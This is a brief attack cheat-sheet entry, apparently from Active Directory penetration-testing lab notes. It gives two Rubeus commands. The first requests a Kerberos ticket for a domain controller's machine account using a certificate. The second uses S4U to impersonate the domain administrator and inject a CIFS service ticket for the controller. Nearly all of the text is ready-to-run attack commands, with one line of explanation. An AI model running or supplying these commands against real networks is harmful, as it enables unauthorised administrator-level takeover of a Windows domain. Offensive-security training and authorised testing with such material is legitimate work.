
This attack is used when impersonation is needed to access some specific service:

```powershell

# get TGT for the domain controller first
.\Rubeus.exe asktgt /user:DC01$ /certificate:"MIIJu<SNIP>" /domain:inlanefreight.ad /dc:DC01.domain.local /getcredentials /show /nowrap

#perform impersonation of the administrator
.\Rubeus.exe s4u /dc:DC01.domain.local /impersonateuser:administrator@domain.local  /ptt /self /service:host/DC01.domain.local  /altservice:cifs/DC01.domain.local  /ticket:$T /ptt
```